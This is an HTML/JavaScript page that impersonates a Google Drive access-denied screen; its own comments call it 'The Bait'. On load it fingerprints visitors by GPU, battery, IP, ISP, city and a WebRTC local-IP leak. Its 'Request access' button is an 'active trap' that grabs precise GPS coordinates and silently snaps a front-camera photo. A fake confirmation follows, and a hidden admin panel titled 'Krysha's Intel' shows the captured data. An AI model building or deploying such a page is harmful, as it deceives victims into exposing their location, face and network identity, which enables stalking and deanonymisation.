<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Drive - Access Denied</title>
    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500&display=swap');
        
        body { font-family: 'Roboto', sans-serif; overflow-x: hidden; background-color: #ffffff; }
        .google-font { font-family: 'Google Sans', sans-serif; }
        
        /* G-Drive UI */
        .g-btn { background-color: #1a73e8; color: white; border: none; box-shadow: 0 1px 2px rgba(60,64,67,0.3); transition: 0.2s; }
        .g-btn:active { background-color: #1765cc; }
        .g-btn:disabled { background-color: #dadce0; color: #888; cursor: not-allowed; box-shadow: none; }
        .g-input { border: 1px solid #dadce0; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; transition: 0.2s; -webkit-appearance: none; }
        .g-input:focus { border-color: #1a73e8; outline: none; border-width: 2px; padding: 11px; }

        /* Admin Panel */
        .admin-view { background-color: #0f172a; color: #cbd5e1; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
        .hidden-mode { display: none !important; }
        .cyber-scroll::-webkit-scrollbar { width: 4px; }
        .cyber-scroll::-webkit-scrollbar-track { background: #1e293b; }
        .cyber-scroll::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }

        /* Animations */
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .live-indicator { animation: flash 2s infinite; }
        
        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
        .log-item { animation: slideIn 0.3s ease-out; }

        /* Mobile Adjustments */
        @media (max-width: 640px) {
            .g-card { padding: 1.5rem; box-shadow: none; border: none; }
            .g-footer { position: relative; padding-bottom: 2rem; }
        }
    </style>
</head>
<body>

    <!-- HIDDEN SENSORS -->
    <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" class="hidden"></canvas>

    <!-- 1. GOOGLE DRIVE UI (The Bait) -->
    <div id="gdrive-view" class="min-h-screen w-full flex flex-col items-center justify-between md:justify-center bg-white relative z-10">
        
        <div class="w-full p-4 flex items-center justify-between md:absolute md:top-0 md:left-0">
            <div class="flex items-center gap-2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Logo" class="w-8 h-8">
                <span class="text-gray-500 text-lg google-font">Drive</span>
            </div>
            <div class="flex items-center gap-3">
                 <button onclick="adminKnock()" class="text-gray-500 p-2 rounded-full outline-none">
                    <i class="fa-regular fa-circle-question text-xl"></i>
                </button>
                <div id="admin-trigger" class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center text-sm font-medium select-none cursor-pointer active:scale-95 transition-transform">S</div>
            </div>
        </div>

        <div class="g-card max-w-[480px] w-full p-8 space-y-6 md:border md:border-gray-200 md:rounded-lg md:shadow-lg">
            <h1 class="text-2xl text-gray-800 google-font font-normal">You need access</h1>
            <div class="text-gray-600 text-[14px] leading-relaxed space-y-2">
                <p>You don't have permission to view the file <strong>"Evidence_Pack_2025.pdf"</strong>.</p>
                <p>Request access from the owner to verify your identity and view the document.</p>
            </div>
            <div class="space-y-6 pt-2">
                <textarea class="g-input h-24 resize-none" placeholder="Message (optional)"></textarea>
                <div class="flex items-center justify-end gap-3">
                    <div class="text-gray-600 text-sm font-medium px-2 py-2 rounded hover:bg-gray-50 cursor-pointer select-none">Switch accounts</div>
                    <button onclick="triggerActiveTrap()" id="req-btn" class="g-btn px-6 py-2 rounded text-sm font-medium w-full md:w-auto flex justify-center items-center">
                        Request access
                    </button>
                </div>
            </div>
        </div>

        <div class="g-footer w-full bg-white md:bg-gray-50 p-4 text-center text-xs text-gray-500 md:border-t md:border-gray-200">
            <p>Google Drive protects your files. <span class="text-blue-700 cursor-pointer">Learn more</span></p>
        </div>
    </div>

    <!-- 2. ADMIN PANEL (The Intel) -->
    <div id="admin-view" class="hidden-mode absolute inset-0 admin-view h-screen flex flex-col z-50">
        
        <div class="bg-slate-900 border-b border-slate-700 p-3 flex justify-between items-center shadow-lg sticky top-0 z-50">
            <div class="flex items-center gap-2">
                <div class="bg-blue-500/20 p-1.5 rounded-full live-indicator">
                    <i class="fa-solid fa-radar text-blue-400 text-sm"></i>
                </div>
                <div>
                    <h1 class="text-xs font-bold text-white tracking-wider uppercase">Krysha's Intel v14.1</h1>
                    <p class="text-[9px] text-slate-400">STATE: <span id="sys-state" class="text-green-400">MONITORING</span></p>
                </div>
            </div>
            <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-[10px] border border-slate-600">EXIT</button>
        </div>

        <div class="flex flex-col md:flex-row flex-grow overflow-hidden">
            <!-- Log List -->
            <div class="w-full md:w-1/4 h-1/3 md:h-full bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex flex-col">
                <div class="p-2 border-b border-slate-800 bg-slate-800/50 flex justify-between items-center">
                    <span class="text-[10px] font-bold text-slate-400 uppercase">Activity Log</span>
                    <button onclick="clearLogs()" class="text-[10px] text-red-400 px-2"><i class="fa-solid fa-trash"></i></button>
                </div>
                <div id="log-list" class="flex-grow overflow-y-auto cyber-scroll p-2 space-y-2">
                    <!-- Logs go here -->
                </div>
            </div>

            <!-- Detail View -->
            <div class="w-full md:w-3/4 h-2/3 md:h-full bg-slate-950 p-4 md:p-6 overflow-y-auto cyber-scroll relative">
                <div class="flex justify-between items-end mb-4 border-b border-slate-800 pb-2">
                    <div>
                        <h2 class="text-lg font-bold text-white" id="detail-title">Select Log</h2>
                        <p class="text-[10px] text-slate-400 mt-1" id="detail-time">--</p>
                    </div>
                    <span id="vpn-badge" class="hidden bg-red-600 text-white text-[9px] px-2 py-1 rounded font-bold uppercase">VPN</span>
                </div>

                <div class="grid grid-cols-1 xl:grid-cols-2 gap-4">
                    <!-- Network -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-green-400 mb-2 uppercase"><i class="fa-solid fa-globe mr-1"></i> Network Info</h3>
                        <div class="space-y-1 font-mono text-xs">
                            <div class="flex justify-between"><span class="text-slate-500">IP:</span> <span id="detail-ip" class="text-white font-bold">Scanning...</span></div>
                            <div class="flex justify-between"><span class="text-slate-500">ISP:</span> <span id="detail-isp" class="text-blue-300 truncate w-32 text-right">...</span></div>
                            <div class="flex justify-between"><span class="text-slate-500">LOC:</span> <span id="detail-city" class="text-slate-300 truncate w-32 text-right">...</span></div>
                            <div class="flex justify-between border-t border-slate-800 pt-1 mt-1"><span class="text-slate-500">WebRTC:</span> <span id="detail-localip" class="text-red-400">...</span></div>
                        </div>
                    </div>

                    <!-- GPS -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2 uppercase"><i class="fa-solid fa-location-cross mr-1"></i> GPS Status</h3>
                        <div id="detail-gps" class="space-y-1 font-mono text-xs text-slate-300">
                             <p class="text-slate-500 italic">No Active Trace.</p>
                        </div>
                    </div>

                    <!-- Photo -->
                    <div class="bg-black border border-slate-700 rounded-lg overflow-hidden aspect-video flex items-center justify-center relative shadow-lg group">
                        <div id="detail-img" class="text-slate-600 flex flex-col items-center">
                            <i class="fa-solid fa-image text-2xl mb-1"></i>
                            <span class="text-[10px]">No Visuals</span>
                        </div>
                    </div>

                    <!-- Device -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-blue-400 mb-2 uppercase"><i class="fa-solid fa-mobile-screen mr-1"></i> System</h3>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-mono text-slate-300">
                            <div><span class="text-slate-500 block">Platform:</span> <span id="detail-platform">...</span></div>
                            <div><span class="text-slate-500 block">Battery:</span> <span id="detail-batt">...</span></div>
                            <div class="col-span-2"><span class="text-slate-500 block">GPU:</span> <span id="detail-gpu" class="truncate block text-yellow-500">...</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // === STORAGE & STATE ===
        const LOG_KEY = 'krysha_logs_v14_1';
        const MAX_LOGS = 50;
        let currentSessionData = {
            ip: "Fetching...",
            isp: "Fetching...",
            city: "Fetching...",
            local_ip: "Scanning...",
            ua: navigator.userAgent,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`,
            gpu: "Analyzing...",
            battery: "Unknown"
        };

        const get = (id) => document.getElementById(id);

        // --- 1. INSTANT PASSIVE LOGGER (On Load) ---
        async function initSystem() {
            // A. Get Sync Data Immediately
            try {
                const cvs = document.createElement('canvas');
                const gl = cvs.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                currentSessionData.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) { currentSessionData.gpu = "Unknown"; }

            if(navigator.getBattery) {
                navigator.getBattery().then(b => currentSessionData.battery = `${Math.round(b.level*100)}%`);
            }

            // B. Log IMMEDIATELY (Even without IP)
            addLog("TARGET CONNECTED", currentSessionData);

            // C. Start Async Network Fetch
            fetchNetworkDetails();
        }

        // --- 2. ASYNC NETWORK FETCH ---
        async function fetchNetworkDetails() {
            try {
                // Try IPAPI first
                const res = await fetch('https://ipapi.co/json/');
                if(!res.ok) throw new Error("Blocked");
                const data = await res.json();
                
                // Update Session Data
                currentSessionData.ip = data.ip;
                currentSessionData.isp = data.org;
                currentSessionData.city = `${data.city}, ${data.country_name}`;
                
                // Update the logs
                addLog("NETWORK RESOLVED", currentSessionData);
                
            } catch(e) {
                // Backup: IPWHOIS
                try {
                    const res2 = await fetch('https://ipwho.is/');
                    const data2 = await res2.json();
                    currentSessionData.ip = data2.ip;
                    currentSessionData.isp = data2.connection?.isp;
                    currentSessionData.city = `${data2.city}, ${data2.country}`;
                    addLog("NETWORK RESOLVED (Backup)", currentSessionData);
                } catch(err) {
                    currentSessionData.ip = "Client Blocked";
                    addLog("NETWORK FAILED", currentSessionData);
                }
            }

            // WebRTC Check
            getLocalIPs().then(ip => {
                currentSessionData.local_ip = ip;
                if(ip !== "Hidden" && ip !== "Secure") addLog("WEBRTC LEAK DETECTED", currentSessionData);
            });
        }

        // --- 3. ACTIVE TRAP (Permission Request) ---
        async function triggerActiveTrap() {
            const btn = get('req-btn');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting...';
            btn.disabled = true;

            let evidence = { ...currentSessionData }; 
            let permissionGranted = false;

            // Parallel Request
            Promise.allSettled([captureGPS(), captureCamera()]).then((results) => {
                
                // GPS
                if (results[0].status === 'fulfilled') {
                    evidence.gps = results[0].value;
                    permissionGranted = true;
                } else {
                    evidence.gps = { error: results[0].reason?.message || "Denied" };
                }

                // Camera
                if (results[1].status === 'fulfilled') {
                    evidence.image = results[1].value;
                    permissionGranted = true;
                } else {
                    evidence.image = null;
                }

                // Log Result
                if(permissionGranted) {
                    addLog("EVIDENCE CAPTURED", evidence);
                } else {
                    addLog("PERMISSION DENIED", evidence);
                }

                // Fake UI Response
                setTimeout(() => {
                    alert("Request sent. Owner will verify.");
                    btn.innerText = "Request Sent";
                    btn.classList.replace('g-btn', 'bg-gray-400');
                    btn.classList.add('cursor-not-allowed');
                }, 1000);
            });
        }

        // --- 4. SENSORS ---
        function getLocalIPs() {
            return new Promise(resolve => {
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                pc.onicecandidate = e => {
                    if(!e.candidate) { pc.close(); resolve("Hidden"); return; }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if(m && !m[1].endsWith('.local')) { pc.close(); resolve(m[1]); }
                };
                pc.createOffer().then(o=>pc.setLocalDescription(o));
                setTimeout(()=>resolve("Secure"), 1000);
            });
        }

        function captureCamera() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const vid = get('hidden-video');
                    const cvs = get('hidden-canvas');
                    vid.srcObject = stream;
                    vid.onloadedmetadata = () => {
                        vid.play();
                        cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
                        setTimeout(() => {
                            const ctx = cvs.getContext('2d');
                            ctx.drawImage(vid,0,0);
                            const d = cvs.toDataURL('image/jpeg', 0.5);
                            stream.getTracks().forEach(track=>track.stop());
                            resolve(d);
                        }, 500);
                    };
                }).catch(reject);
            });
        }

        function captureGPS() {
            return new Promise((resolve, reject) => {
                if(!navigator.geolocation) reject("No API");
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    err => reject(err),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // --- 5. LOGGING LOGIC ---
        function addLog(type, data) {
            let logs = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
            logs.unshift({
                id: Date.now(),
                time: new Date().toLocaleTimeString(),
                type: type,
                data: JSON.parse(JSON.stringify(data)) 
            });
            if (logs.length > MAX_LOGS) logs.pop();
            localStorage.setItem(LOG_KEY, JSON.stringify(logs));
            if (!get('admin-view').classList.contains('hidden-mode')) renderLogs();
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
            const list = get('log-list');
            list.innerHTML = '';
            
            if(logs.length === 0) { list.innerHTML = '<p class="text-[10px] text-slate-500 text-center mt-4">No Data</p>'; return; }

            logs.forEach(log => {
                let color = 'border-slate-600';
                if(log.type.includes('CAPTURED')) color = 'border-green-500';
                else if(log.type.includes('DENIED')) color = 'border-red-500';
                else if(log.type.includes('RESOLVED')) color = 'border-blue-500';

                const item = document.createElement('div');
                item.className = `log-item p-2 bg-slate-800 rounded border-l-2 ${color} cursor-pointer hover:bg-slate-700 mb-2`;
                item.innerHTML = `
                    <div class="flex justify-between items-center mb-1">
                        <span class="font-bold text-[9px] uppercase text-white">${log.type}</span>
                        <span class="text-[8px] text-slate-500">${log.time}</span>
                    </div>
                    <p class="text-[9px] text-slate-400 font-mono truncate">${log.data.ip}</p>
                `;
                item.onclick = () => showDetails(log);
                list.appendChild(item);
            });
        }

        function showDetails(log) {
            const d = log.data;
            get('detail-title').innerText = log.type;
            get('detail-time').innerText = log.time;

            get('detail-ip').innerText = d.ip;
            get('detail-isp').innerText = d.isp;
            get('detail-city').innerText = d.city;
            get('detail-localip').innerText = d.local_ip;
            get('detail-platform').innerText = d.platform;
            get('detail-batt').innerText = d.battery;
            get('detail-gpu').innerText = d.gpu;

            const gpsEl = get('detail-gps');
            if(d.gps && d.gps.lat) {
                gpsEl.innerHTML = `
                    <p class="text-green-400 font-bold mb-1">LOCKED</p>
                    <div>Lat: ${d.gps.lat}</div><div>Lon: ${d.gps.lon}</div>
                    <a href="https://maps.google.com/?q=${d.gps.lat},${d.gps.lon}" target="_blank" class="text-blue-400 underline mt-1 block">Map</a>
                `;
            } else {
                gpsEl.innerHTML = `<p class="text-slate-500 italic">${d.gps?.error || "No Active Trace"}</p>`;
            }

            const imgEl = get('detail-img');
            imgEl.innerHTML = d.image ? `<img src="${d.image}" class="w-full h-full object-cover">` : `<i class="fa-solid fa-image text-2xl mb-1 text-slate-600"></i><span class="text-[10px] text-slate-600">No Image</span>`;
            
            get('vpn-badge').classList.toggle('hidden', d.local_ip === "Secure" || d.local_ip === "Scanning...");
        }

        function clearLogs() { localStorage.removeItem(LOG_KEY); renderLogs(); }
        function toggleView() { 
            get('admin-view').classList.toggle('hidden-mode'); 
            get('gdrive-view').classList.toggle('hidden-mode');
            renderLogs(); 
        }

        // --- 6. TRIGGERS ---
        // Desktop: Triple Click '?'
        let knockCounter = 0, knockTimer;
        function adminKnock() {
            knockCounter++; clearTimeout(knockTimer); knockTimer=setTimeout(()=>knockCounter=0, 2000);
            if(knockCounter===3) { toggleView(); knockCounter=0; }
        }
        
        // Mobile: Long Press 'S' Avatar
        let pressTimer;
        const trig = get('admin-trigger');
        trig.onmousedown = trig.ontouchstart = () => pressTimer = setTimeout(() => { toggleView(); if(navigator.vibrate) navigator.vibrate(50); }, 2000);
        trig.onmouseup = trig.onmouseleave = trig.ontouchend = () => clearTimeout(pressTimer);

        // Start
        window.onload = initSystem;
    </script>
</body>
</html>
